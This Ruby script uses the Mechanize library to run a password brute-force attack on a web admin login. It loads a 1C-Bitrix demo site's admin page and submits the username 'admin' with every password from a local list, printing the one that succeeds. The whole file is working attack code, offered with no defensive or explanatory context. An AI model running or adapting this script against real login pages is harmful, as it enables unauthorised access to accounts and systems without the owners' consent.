require 'mechanize'
require 'progress_bar'

passes = []
File.open("./passes.txt", "r") do |f|
  while line = f.gets
    passes << line.chomp.chomp
  end
end
agent = Mechanize.new
agent.get("http://1554.demo.1c-bitrix.ru/bitrix/admin/?lang=en")

bar = ProgressBar.new(passes.length)

passes.each_with_index do |pass, index|
  bar.increment!
  form = agent.page.forms.first
  form.USER_LOGIN = "admin"
  form.USER_PASSWORD = pass
  form.submit
  if agent.page.forms.count != 1
    puts pass
    exit
  end
end